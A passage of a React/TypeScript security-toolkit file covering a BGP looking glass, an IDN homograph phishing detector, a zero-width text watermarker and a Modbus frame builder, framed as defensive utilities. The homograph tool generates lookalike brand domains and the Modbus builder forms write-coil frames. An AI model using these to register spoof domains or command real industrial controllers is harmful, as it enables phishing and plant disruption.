          <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white">
            <div className="flex items-center justify-between mb-1.5">
              <span className="font-heading text-xs font-bold uppercase tracking-wider text-emerald-400">
                Neutralized / Defanged Stream + Ghostscript CLI
              </span>
              <InlineCopyButton text={analysis.sanitizedStream} label="Copy Sanitized PDF" />
            </div>
            <pre className="font-mono-code text-[11px] text-gray-300 max-h-40 overflow-y-auto whitespace-pre-wrap">
              {analysis.cliCommands}
            </pre>
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 3. LIVE BGP ASN PEERING & LOOKING GLASS
 * ========================================================================== */
interface AsnFallbackRecord {
  asn: string;
  holder: string;
  rir: string;
  rpkiStatus: "VALID (ROA Enforced)" | "PARTIAL ROA" | "INVALID (Sub-Prefix Hijack Blocked)";
  ipv4Prefixes: string[];
  ipv6Prefixes: string[];
  upstreams: string[];
}

const ASN_FALLBACK_DB: Record<string, AsnFallbackRecord> = {
  AS13335: {
    asn: "AS13335",
    holder: "CLOUDFLARENET - Cloudflare, Inc. (US)",
    rir: "ARIN / Anycast Global",
    rpkiStatus: "VALID (ROA Enforced)",
    ipv4Prefixes: ["1.1.1.0/24", "104.16.0.0/13", "162.158.0.0/15", "172.64.0.0/13", "188.114.96.0/20"],
    ipv6Prefixes: ["2606:4700::/32", "2803:f800::/32", "2a06:98c0::/29"],
    upstreams: ["AS174 (Cogent)", "AS1299 (Arelion)", "AS3356 (Lumen)", "AS2914 (NTT)"],
  },
  AS15169: {
    asn: "AS15169",
    holder: "GOOGLE - Google LLC (US)",
    rir: "ARIN",
    rpkiStatus: "VALID (ROA Enforced)",
    ipv4Prefixes: ["8.8.8.0/24", "8.8.4.0/24", "142.250.0.0/15", "172.217.0.0/16", "216.58.192.0/19"],
    ipv6Prefixes: ["2001:4860::/32", "2607:f8b0::/32", "2a00:1450::/32"],
    upstreams: ["AS3356 (Lumen)", "AS1299 (Arelion)", "Direct IXP Peering"],
  },
  AS16509: {
    asn: "AS16509",
    holder: "AMAZON-02 - Amazon.com, Inc. (AWS Cloud)",
    rir: "ARIN",
    rpkiStatus: "VALID (ROA Enforced)",
    ipv4Prefixes: ["3.0.0.0/9", "13.32.0.0/15", "52.0.0.0/11", "54.239.128.0/18"],
    ipv6Prefixes: ["2600:1f00::/24", "2a05:d000::/24"],
    upstreams: ["AS1299 (Arelion)", "AS2914 (NTT)", "AS6453 (Tata Communications)"],
  },
  AS45609: {
    asn: "AS45609",
    holder: "BHARTI-MOBILITY-AS-AP Bharti Airtel Ltd. (IN)",
    rir: "APNIC",
    rpkiStatus: "VALID (ROA Enforced)",
    ipv4Prefixes: ["49.32.0.0/11", "106.192.0.0/11", "122.160.0.0/12", "182.64.0.0/12"],
    ipv6Prefixes: ["2401:4900::/32", "2404:7c00::/32"],
    upstreams: ["AS9498 (BHARTI-IN)", "AS6453 (Tata)", "AS3356 (Lumen)"],
  },
};

function LiveBgpAsnPeeringLookingGlass({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [query, setQuery] = useState("AS13335");
  const [loading, setLoading] = useState(false);
  const [holder, setHolder] = useState(ASN_FALLBACK_DB.AS13335.holder);
  const [ipv4List, setIpv4List] = useState<string[]>(ASN_FALLBACK_DB.AS13335.ipv4Prefixes);
  const [ipv6List, setIpv6List] = useState<string[]>(ASN_FALLBACK_DB.AS13335.ipv6Prefixes);
  const [upstreams, setUpstreams] = useState<string[]>(ASN_FALLBACK_DB.AS13335.upstreams);
  const [sourceStatus, setSourceStatus] = useState("Loaded verified ASN BGP profile (Click Query Live RIPE Stat BGP API for real-time RIB dump).");
  const [hijackSimMode, setHijackSimMode] = useState<"normal" | "subprefix-hijack" | "route-leak">("normal");

  const applyFallback = useCallback((rawQ: string) => {
    const clean = rawQ.trim().toUpperCase();
    const key = clean.startsWith("AS") ? clean : `AS${clean}`;
    const fb = ASN_FALLBACK_DB[key] || ASN_FALLBACK_DB.AS13335;
    setHolder(fb.holder);
    setIpv4List(fb.ipv4Prefixes);
    setIpv6List(fb.ipv6Prefixes);
    setUpstreams(fb.upstreams);
  }, []);

  const queryRipeStat = async (targetQuery?: string) => {
    const q = (targetQuery ?? query).trim().toUpperCase();
    if (!q) return;
    setLoading(true);
    setSourceStatus(`Querying https://stat.ripe.net/data/as-overview & announced-prefixes for ${q}...`);

    try {
      const [overviewRes, prefixesRes] = await Promise.all([
        fetch(`https://stat.ripe.net/data/as-overview/data.json?resource=${encodeURIComponent(q)}`),
        fetch(`https://stat.ripe.net/data/announced-prefixes/data.json?resource=${encodeURIComponent(q)}`),
      ]);

      if (!overviewRes.ok || !prefixesRes.ok) {
        throw new Error("RIPE Stat HTTP error");
      }

      const overviewJson = await overviewRes.json();
      const prefixesJson = await prefixesRes.json();

      const liveHolder = overviewJson?.data?.holder || `${q} Autonomous System`;
      const rawPrefixes: { prefix: string }[] = prefixesJson?.data?.prefixes || [];
      const v4: string[] = [];
      const v6: string[] = [];
      for (const item of rawPrefixes) {
        if (item.prefix.includes(":")) {
          if (v6.length < 18) v6.push(item.prefix);
        } else {
          if (v4.length < 24) v4.push(item.prefix);
        }
      }

      setHolder(liveHolder);
      if (v4.length > 0 || v6.length > 0) {
        setIpv4List(v4);
        setIpv6List(v6);
      } else {
        applyFallback(q);
      }
      setSourceStatus(`Live RIPE RIS BGP Looking Glass response received (${rawPrefixes.length.toLocaleString()} total prefixes announced).`);
    } catch {
      applyFallback(q);
      setSourceStatus(`RIPE API unreachable or rate-limited; displaying built-in BGP Looking Glass snapshot for ${q}.`);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const out = [
      `# BGP Looking Glass & RPKI ROA Report (${query.toUpperCase()})`,
      `AS Holder: ${holder}`,
      `Status: ${sourceStatus}`,
      `Announced IPv4 Sample (${ipv4List.length}): ${ipv4List.join(", ")}`,
      `Announced IPv6 Sample (${ipv6List.length}): ${ipv6List.join(", ")}`,
      `Upstream Transit Peers: ${upstreams.join(" | ")}`,
      `RPKI Hijack Simulation Mode: ${hijackSimMode}`,
    ].join("\n");
    setOutput(out);
  }, [query, holder, sourceStatus, ipv4List, ipv6List, upstreams, hijackSimMode, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center gap-2">
        {Object.keys(ASN_FALLBACK_DB).map((asnKey) => (
          <button
            key={asnKey}
            type="button"
            onClick={() => {
              setQuery(asnKey);
              applyFallback(asnKey);
              queryRipeStat(asnKey);
            }}
            className={`rounded-xs px-3 py-1.5 font-mono-code text-xs font-bold transition cursor-pointer ${
              query.toUpperCase() === asnKey
                ? "bg-[#ff6a00] text-white"
                : "border border-border bg-background text-text-muted hover:border-accent hover:text-text"
            }`}
          >
            {asnKey} ({ASN_FALLBACK_DB[asnKey].holder.split(" ")[0]})
          </button>
        ))}
      </div>

      <div className="flex flex-col sm:flex-row gap-3">
        <input
          type="text"
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          placeholder="AS13335, AS15169, AS16509, AS45609..."
          className="flex-1 rounded-xs border border-border bg-background px-3.5 py-2 font-mono-code text-sm text-text focus:border-accent focus:outline-none"
        />
        <button
          type="button"
          onClick={() => queryRipeStat()}
          disabled={loading}
          className="inline-flex items-center justify-center gap-2 rounded-xs bg-[#ff6a00] px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider text-white hover:opacity-90 disabled:opacity-50 cursor-pointer"
        >
          <Globe className="h-3.5 w-3.5" />
          {loading ? "Querying RIPE RIS..." : "Query Live RIPE Stat BGP API"}
        </button>
      </div>

      <div className="text-xs font-mono-code text-text-muted">{sourceStatus}</div>

      {/* Holder & RPKI Simulator */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="rounded-xs border border-border bg-background p-3.5 md:col-span-2">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Autonomous System Holder</div>
          <div className="mt-1 font-mono-code text-base font-bold text-text">{holder}</div>
          <div className="mt-2 flex flex-wrap gap-1.5">
            {upstreams.map((u) => (
              <span key={u} className="rounded-xs border border-border bg-surface px-2 py-0.5 font-mono-code text-[11px] text-accent">
                Upstream: {u}
              </span>
            ))}
          </div>
        </div>

        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted mb-1.5">
            RPKI ROA Hijack Simulator
          </div>
          <select
            value={hijackSimMode}
            onChange={(e) => setHijackSimMode(e.target.value as typeof hijackSimMode)}
            className="w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
          >
            <option value="normal">Legitimate Origin (RPKI VALID)</option>
            <option value="subprefix-hijack">Rogue /25 Sub-Prefix Hijack</option>
            <option value="route-leak">AS-PATH Valley-Free Route Leak</option>
          </select>
          <div
            className={`mt-2 font-mono-code text-xs font-bold ${
              hijackSimMode === "normal" ? "text-emerald-400" : "text-red-400"
            }`}
          >
            {hijackSimMode === "normal"
              ? "ROA VALID: MaxLength /24 matched"
              : hijackSimMode === "subprefix-hijack"
              ? "ROA INVALID: Dropped by ROV Peers!"
              : "ASPA / PeerLock Alert: Valley Violation"}
          </div>
        </div>
      </div>

      {/* Prefix Tables */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="mb-2 flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
              Announced IPv4 Prefixes ({ipv4List.length})
            </span>
            <InlineCopyButton text={ipv4List.join("\n")} label="Copy IPv4" />
          </div>
          <div className="flex flex-wrap gap-1.5 max-h-40 overflow-y-auto">
            {ipv4List.map((pfx) => (
              <span key={pfx} className="rounded-xs border border-border bg-surface px-2 py-1 font-mono-code text-xs text-emerald-400">
                {pfx}
              </span>
            ))}
          </div>
        </div>

        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="mb-2 flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
              Announced IPv6 Prefixes ({ipv6List.length})
            </span>
            <InlineCopyButton text={ipv6List.join("\n")} label="Copy IPv6" />
          </div>
          <div className="flex flex-wrap gap-1.5 max-h-40 overflow-y-auto">
            {ipv6List.map((pfx) => (
              <span key={pfx} className="rounded-xs border border-border bg-surface px-2 py-1 font-mono-code text-xs text-sky-400">
                {pfx}
              </span>
            ))}
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 4. IDN HOMOGRAPH & PUNYCODE PHISHING DETECTOR
 * ========================================================================== */
const CONFUSABLE_MAP: Record<string, { ascii: string; script: string; name: string }> = {
  "\u0430": { ascii: "a", script: "Cyrillic", name: "Cyrillic Small Letter A" },
  "\u0435": { ascii: "e", script: "Cyrillic", name: "Cyrillic Small Letter Ie" },
  "\u043E": { ascii: "o", script: "Cyrillic", name: "Cyrillic Small Letter O" },
  "\u0440": { ascii: "p", script: "Cyrillic", name: "Cyrillic Small Letter Er" },
  "\u0441": { ascii: "c", script: "Cyrillic", name: "Cyrillic Small Letter Es" },
  "\u0443": { ascii: "y", script: "Cyrillic", name: "Cyrillic Small Letter U" },
  "\u0445": { ascii: "x", script: "Cyrillic", name: "Cyrillic Small Letter Ha" },
  "\u0456": { ascii: "i", script: "Cyrillic", name: "Cyrillic/Ukrainian Small Letter Byelorussian-Ukrainian I" },
  "\u0455": { ascii: "s", script: "Cyrillic", name: "Cyrillic Small Letter Dze" },
  "\u03BF": { ascii: "o", script: "Greek", name: "Greek Small Letter Omicron" },
  "\u03B1": { ascii: "a", script: "Greek", name: "Greek Small Letter Alpha" },
  "\u03BD": { ascii: "v", script: "Greek", name: "Greek Small Letter Nu" },
};

// Pure RFC 3492 Bootstring Punycode Label Encoder/Decoder
function encodePunycodeLabel(input: string): string {
  const codePoints = Array.from(input).map((c) => c.codePointAt(0) || 0);
  if (codePoints.every((cp) => cp < 0x80)) return input;

  const basic = codePoints.filter((cp) => cp < 0x80).map((cp) => String.fromCodePoint(cp));
  let output = basic.join("");
  const b = basic.length;
  if (b > 0) output += "-";

  let n = 128;
  let delta = 0;
  let bias = 72;
  let h = b;

  const adapt = (d: number, numPoints: number, firstTime: boolean) => {
    let k = 0;
    d = firstTime ? Math.floor(d / 700) : d >> 1;
    d += Math.floor(d / numPoints);
    while (d > 455) {
      d = Math.floor(d / 35);
      k += 36;
    }
    return k + Math.floor((36 * d) / (d + 38));
  };

  const encodeDigit = (d: number) => (d < 26 ? d + 97 : d - 26 + 48);

  while (h < codePoints.length) {
    let m = Infinity;
    for (const cp of codePoints) {
      if (cp >= n && cp < m) m = cp;
    }
    delta += (m - n) * (h + 1);
    n = m;

    for (const cp of codePoints) {
      if (cp < n) delta++;
      if (cp === n) {
        let q = delta;
        for (let k = 36; ; k += 36) {
          const t = k <= bias ? 1 : k >= bias + 26 ? 26 : k - bias;
          if (q < t) break;
          output += String.fromCharCode(encodeDigit(t + ((q - t) % (36 - t))));
          q = Math.floor((q - t) / (36 - t));
        }
        output += String.fromCharCode(encodeDigit(q));
        bias = adapt(delta, h + 1, h === b);
        delta = 0;
        h++;
      }
    }
    delta++;
    n++;
  }
  return `xn--${output}`;
}

function decodePunycodeLabel(input: string): string {
  if (!input.toLowerCase().startsWith("xn--")) return input;
  const encoded = input.slice(4).toLowerCase();
  const delimIdx = encoded.lastIndexOf("-");
  const out: number[] = [];

  if (delimIdx > 0) {
    for (let j = 0; j < delimIdx; j++) {
      out.push(encoded.charCodeAt(j));
    }
  }

  let n = 128;
  let i = 0;
  let bias = 72;

  const adapt = (d: number, numPoints: number, firstTime: boolean) => {
    let k = 0;
    d = firstTime ? Math.floor(d / 700) : d >> 1;
    d += Math.floor(d / numPoints);
    while (d > 455) {
      d = Math.floor(d / 35);
      k += 36;
    }
    return k + Math.floor((36 * d) / (d + 38));
  };

  let idx = delimIdx > -1 ? delimIdx + 1 : 0;
  while (idx < encoded.length) {
    const oldi = i;
    let w = 1;
    for (let k = 36; ; k += 36) {
      if (idx >= encoded.length) break;
      const code = encoded.charCodeAt(idx++);
      const digit = code - 48 < 10 ? code - 22 : code - 97 < 26 ? code - 97 : 36;
      i += digit * w;
      const t = k <= bias ? 1 : k >= bias + 26 ? 26 : k - bias;
      if (digit < t) break;
      w *= 36 - t;
    }
    const outLen = out.length + 1;
    bias = adapt(i - oldi, outLen, oldi === 0);
    n += Math.floor(i / outLen);
    i %= outLen;
    out.splice(i, 0, n);
    i++;
  }

  return String.fromCodePoint(...out);
}

function IdnHomographPunycodePhishingDetector({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [domainInput, setDomainInput] = useState("\u0430pple.com");

  const presets = [
    { label: "Cyrillic аpple.com (xn--pple-43d.com)", value: "\u0430pple.com" },
    { label: "Punycode xn--pple-43d.com", value: "xn--pple-43d.com" },
    { label: "Ukrainian mіcrosoft.com", value: "m\u0456crosoft.com" },
    { label: "Cyrillic раypal.com", value: "\u0440\u0430ypal.com" },
    { label: "Greek gοοgle.com", value: "g\u03BF\u03BFgle.com" },
    { label: "Safe ASCII cloudflare.com", value: "cloudflare.com" },
  ];

  const analysis = useMemo(() => {
    const clean = domainInput.trim().replace(/^https?:\/\//i, "").split("/")[0];
    const labels = clean.split(".");
    const unicodeDomain = labels.map((l) => decodePunycodeLabel(l)).join(".");
    const punycodeDomain = labels.map((l) => encodePunycodeLabel(decodePunycodeLabel(l))).join(".");

    const chars = Array.from(unicodeDomain).map((ch, idx) => {
      const cp = ch.codePointAt(0) || 0;
      const hex = `U+${cp.toString(16).toUpperCase().padStart(4, "0")}`;
      const confusable = CONFUSABLE_MAP[ch];
      const isAscii = cp < 0x80;
      const script = isAscii
        ? "ASCII"
        : confusable?.script || (cp >= 0x0400 && cp <= 0x04ff ? "Cyrillic" : cp >= 0x0370 && cp <= 0x03ff ? "Greek" : "Non-ASCII Unicode");
      return {
        index: idx,
        char: ch,
        hex,
        isAscii,
        script,
        lookalikeFor: confusable?.ascii || (isAscii ? ch : "?"),
        name: confusable?.name || (isAscii ? "Basic Latin ASCII" : "Extended Unicode Glyph"),
      };
    });

    const nonAsciiChars = chars.filter((c) => !c.isAscii);
    const intendedAsciiDomain = chars.map((c) => c.lookalikeFor).join("");

    // Generate defensive typosquatting / homograph permutations
    const baseName = intendedAsciiDomain.split(".")[0] || "brand";
    const tld = intendedAsciiDomain.split(".").slice(1).join(".") || "com";
    const defensiveVariants = [
      `${baseName.replace(/a/g, "\u0430")}.${tld}`,
      `${baseName.replace(/o/g, "\u043E")}.${tld}`,
      `${baseName.replace(/e/g, "\u0435")}.${tld}`,
      `${baseName}-security.${tld}`,
      `${baseName}s.${tld}`,
    ].map((u) => ({
      unicode: u,
      punycode: u
        .split(".")
        .map((l) => encodePunycodeLabel(l))
        .join("."),
    }));

    return {
      unicodeDomain,
      punycodeDomain,
      intendedAsciiDomain,
      chars,
      nonAsciiCount: nonAsciiChars.length,
      isSpoof: nonAsciiChars.length > 0,
      defensiveVariants,
    };
  }, [domainInput]);

  useEffect(() => {
    const out = [
      `# IDN Homograph & Punycode Analysis`,
      `Input Domain: ${domainInput}`,
      `Rendered Unicode: ${analysis.unicodeDomain}`,
      `RFC 3492 Punycode (ACE): ${analysis.punycodeDomain}`,
      `Impersonated ASCII Target: ${analysis.intendedAsciiDomain}`,
      `Verdict: ${analysis.isSpoof ? `CRITICAL IDN HOMOGRAPH SPOOF (${analysis.nonAsciiCount} non-ASCII lookalike glyph(s))` : "SAFE PURE ASCII DOMAIN"}`,
      `\n## Character-by-Character Codepoint Audit`,
      ...analysis.chars.map((c) => `[${c.index}] '${c.char}' (${c.hex}) | Script: ${c.script} | Maps to ASCII '${c.lookalikeFor}' (${c.name})`),
    ].join("\n");
    setOutput(out);
  }, [domainInput, analysis, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-2">
        {presets.map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => setDomainInput(p.value)}
            className="rounded-xs border border-border bg-background px-3 py-1.5 font-mono-code text-xs text-text-muted hover:border-accent hover:text-text transition cursor-pointer"
          >
            {p.label}
          </button>
        ))}
      </div>

      <div>
        <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
          Suspect Domain or Punycode (`xn--`) Input
        </label>
        <input
          type="text"
          value={domainInput}
          onChange={(e) => setDomainInput(e.target.value)}
          className="w-full rounded-xs border border-border bg-background px-3.5 py-2.5 font-mono-code text-sm text-text focus:border-accent focus:outline-none"
        />
      </div>

      {/* Verdict & Conversion Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Unicode Display Form</div>
          <div className="mt-1 font-mono-code text-lg font-bold text-text">{analysis.unicodeDomain}</div>
        </div>
        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">DNS Punycode (ACE Wire Form)</div>
          <div className="mt-1 font-mono-code text-lg font-bold text-accent">{analysis.punycodeDomain}</div>
        </div>
        <div
          className={`rounded-xs border p-3.5 ${
            analysis.isSpoof ? "border-red-500/60 bg-red-500/10" : "border-emerald-500/60 bg-emerald-500/10"
          }`}
        >
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Homograph Verdict</div>
          <div className={`mt-1 font-heading text-sm font-bold uppercase ${analysis.isSpoof ? "text-red-400" : "text-emerald-400"}`}>
            {analysis.isSpoof
              ? `SPOOF ALERT: Impersonates ${analysis.intendedAsciiDomain}`
              : "100% Genuine Basic ASCII"}
          </div>
        </div>
      </div>

      {/* Character Codepoint Grid */}
      <div className="rounded-xs border border-border bg-background p-4">
        <div className="mb-3 font-heading text-xs font-bold uppercase tracking-wider text-text">
          Character-by-Character Unicode Codepoint & Script Breakdown
        </div>
        <div className="flex flex-wrap gap-2">
          {analysis.chars.map((c) => (
            <div
              key={c.index}
              className={`rounded-xs border p-2.5 min-w-[96px] text-center font-mono-code ${
                !c.isAscii
                  ? "border-red-500 bg-red-500/15 text-red-300"
                  : "border-border bg-surface text-text"
              }`}
            >
              <div className="text-xl font-bold">{c.char}</div>
              <div className="mt-1 text-[11px] font-bold text-accent">{c.hex}</div>
              <div className="text-[10px] text-text-muted">{c.script}</div>
              {!c.isAscii && (
                <div className="mt-1 rounded-xs bg-red-500/30 px-1 py-0.5 text-[10px] text-white">
                  Spoofs &apos;{c.lookalikeFor}&apos;
                </div>
              )}
            </div>
          ))}
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 5. ZERO-WIDTH UNICODE CANARY TRAP STUDIO
 * ========================================================================== */
const ZW_SPACE = "\u200B"; // binary 0
const ZW_NON_JOINER = "\u200C"; // binary 1
const ZW_JOINER = "\u200D"; // start/end frame marker

function encodeZeroWidthCanary(coverText: string, secretId: string): string {
  const cleanCover = coverText.replace(/[\u200B\u200C\u200D\uFEFF]/g, "");
  if (!secretId) return cleanCover;

  const bits = Array.from(secretId)
    .map((ch) => (ch.charCodeAt(0) & 0xff).toString(2).padStart(8, "0"))
    .join("");

  const zwPayload =
    ZW_JOINER +
    Array.from(bits)
      .map((b) => (b === "0" ? ZW_SPACE : ZW_NON_JOINER))
      .join("") +
    ZW_JOINER;

  const firstSpace = cleanCover.indexOf(" ");
  if (firstSpace === -1) return cleanCover + zwPayload;
  return cleanCover.slice(0, firstSpace) + zwPayload + cleanCover.slice(firstSpace);
}

function decodeZeroWidthCanary(suspectText: string): {
  decodedSecret: string;
  zwCount: number;
  binaryStream: string;
} {
  const zwChars = Array.from(suspectText).filter((c) => c === ZW_SPACE || c === ZW_NON_JOINER || c === ZW_JOINER);
  const bits = zwChars
    .filter((c) => c === ZW_SPACE || c === ZW_NON_JOINER)
    .map((c) => (c === ZW_SPACE ? "0" : "1"))
    .join("");

  let decoded = "";
  for (let i = 0; i + 8 <= bits.length; i += 8) {
    const byte = parseInt(bits.slice(i, i + 8), 2);
    if (byte >= 32 && byte <= 126) {
      decoded += String.fromCharCode(byte);
    }
  }

  return {
    decodedSecret: decoded,
    zwCount: zwChars.length,
    binaryStream: bits,
  };
}

function ZeroWidthUnicodeCanaryTrapStudio({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [tab, setTab] = useState<"embed" | "extract">("embed");
  const [coverText, setCoverText] = useState(
    "CONFIDENTIAL ACQUISITION MEMO: Project Titan valuation is finalized at $420M Ahead of Q4 earnings call."
  );
  const [canaryId, setCanaryId] = useState("leak-id-07");
  const [suspectInput, setSuspectInput] = useState("");

  const watermarkedText = useMemo(() => encodeZeroWidthCanary(coverText, canaryId), [coverText, canaryId]);

  useEffect(() => {
    if (!suspectInput) {
      setSuspectInput(watermarkedText);
    }
  }, [watermarkedText, suspectInput]);

  const extraction = useMemo(() => decodeZeroWidthCanary(suspectInput), [suspectInput]);

  useEffect(() => {
    const out = [
      `# Zero-Width Unicode Canary Trap Studio`,
      `Canary Identifier: ${canaryId}`,
      `Invisible Zero-Width Characters Injected: ${watermarkedText.length - coverText.replace(/[\u200B\u200C\u200D]/g, "").length} chars`,
      `\n## Watermarked Text (Copy & Paste into Slack / Email / WhatsApp)`,
      watermarkedText,
      `\n## Forensic Decoder Result`,
      `Detected Zero-Width Chars: ${extraction.zwCount}`,
      `Extracted Canary Secret: ${extraction.decodedSecret || "(None Detected)"}`,
      `Binary Bitstream: ${extraction.binaryStream || "(Empty)"}`,
    ].join("\n");
    setOutput(out);
  }, [canaryId, coverText, watermarkedText, extraction, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex gap-2 border-b border-border pb-3">
        <button
          type="button"
          onClick={() => setTab("embed")}
          className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            tab === "embed" ? "bg-[#ff6a00] text-white" : "border border-border bg-background text-text-muted hover:text-text"
          }`}
        >
          (A) Embed Invisible Canary Trap
        </button>
        <button
          type="button"
          onClick={() => {
            setSuspectInput(watermarkedText);
            setTab("extract");
          }}
          className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            tab === "extract" ? "bg-[#ff6a00] text-white" : "border border-border bg-background text-text-muted hover:text-text"
          }`}
        >
          (B) Detect & Extract Canary from Leak
        </button>
      </div>

      {tab === "embed" ? (
        <div className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div className="md:col-span-2">
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
                Public Document / Memo Text
              </label>
              <textarea
                rows={3}
                value={coverText}
                onChange={(e) => setCoverText(e.target.value)}
                className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
              />
            </div>

            <div>
              <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
                Secret Recipient Canary ID
              </label>
              <input
                type="text"
                value={canaryId}
                onChange={(e) => setCanaryId(e.target.value)}
                placeholder="leak-id-07"
                className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-sm text-accent font-bold focus:border-accent focus:outline-none"
              />
              <div className="mt-2 flex flex-wrap gap-1.5">
                {["leak-id-07", "board-cfo-02", "press-vip-19"].map((preset) => (
                  <button
                    key={preset}
                    type="button"
                    onClick={() => setCanaryId(preset)}
                    className="rounded-xs border border-border bg-surface px-2 py-1 font-mono-code text-[11px] text-text-muted hover:border-accent hover:text-text cursor-pointer"
                  >
                    {preset}
                  </button>
                ))}
              </div>
            </div>
          </div>

          <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
                Steganographic Output (Contains {watermarkedText.length - coverText.length} Invisible Zero-Width Codepoints)
              </span>
              <div className="flex gap-2">
                <InlineCopyButton text={watermarkedText} label="Copy Watermarked Text" />
                <button
                  type="button"
                  onClick={() => {
                    setSuspectInput(watermarkedText);
                    setTab("extract");
                  }}
                  className="rounded-xs bg-emerald-600 px-2.5 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-white hover:opacity-90 cursor-pointer"
                >
                  Send to Forensic Decoder →
                </button>
              </div>
            </div>
            <p className="font-mono-code text-xs text-gray-200 select-all">{watermarkedText}</p>
            <div className="text-[11px] font-mono-code text-emerald-400">
              Encoding Map: U+200B (ZWSP) = 0 | U+200C (ZWNJ) = 1 | U+200D (ZWJ) = Frame Delimiter
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div>
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
              Paste Suspect Leaked Text to Decode Hidden Watermark
            </label>
            <textarea
              rows={4}
              value={suspectInput}
              onChange={(e) => setSuspectInput(e.target.value)}
              className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
            />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Decoded Leak Source ID</div>
              <div className="mt-1 font-mono-code text-xl font-bold text-red-400">
                {extraction.decodedSecret || "NO CANARY FOUND"}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Zero-Width Codepoints</div>
              <div className="mt-1 font-mono-code text-xl font-bold text-accent">{extraction.zwCount} hidden chars</div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Payload Bitstream</div>
              <div className="mt-1 font-mono-code text-xs text-emerald-400 break-all">
                {extraction.binaryStream.slice(0, 48)}
                {extraction.binaryStream.length > 48 ? "..." : ""}
              </div>
            </div>
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 6. MODBUS / MQTT SCADA & IOT FRAME BUILDER
 * ========================================================================== */
function computeModbusCrc16(bytes: number[]): [number, number] {
  let crc = 0xffff;
  for (const b of bytes) {
    crc ^= b & 0xff;
    for (let i = 0; i < 8; i++) {
      if ((crc & 0x0001) !== 0) {
        crc = (crc >> 1) ^ 0xa001;
      } else {
        crc >>= 1;
      }
    }
  }
  // Modbus RTU transmits CRC-16 Low Byte first, then High Byte (Little-Endian)
  return [crc & 0xff, (crc >> 8) & 0xff];
}

function ModbusMqttScadaIotFrameBuilder({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [tab, setTab] = useState<"modbus" | "mqtt">("modbus");

  // Modbus state
  const [slaveId, setSlaveId] = useState(1);
  const [funcCode, setFuncCode] = useState<number>(0x03);
  const [startAddr, setStartAddr] = useState(40001);
  const [quantityOrVal, setQuantityOrVal] = useState(10);
  const [txId, setTxId] = useState(1);

  // MQTT state
  const [mqttTopic, setMqttTopic] = useState("plant/plc01/firmware/#");
  const [mqttClientRole, setMqttClientRole] = useState<"anonymous" | "sensor-readonly" | "scada-admin">("anonymous");

  const modbusFrames = useMemo(() => {
    const unit = Math.max(1, Math.min(247, slaveId));
    const addr = Math.max(0, Math.min(65535, startAddr));
    const val = Math.max(1, Math.min(65535, quantityOrVal));

    let pdu: number[] = [];
    if (funcCode === 0x05) {
      // Write Single Coil uses 0xFF00 for ON, 0x0000 for OFF
      const coilVal = val > 0 ? 0xff00 : 0x0000;
      pdu = [funcCode, (addr >> 8) & 0xff, addr & 0xff, (coilVal >> 8) & 0xff, coilVal & 0xff];
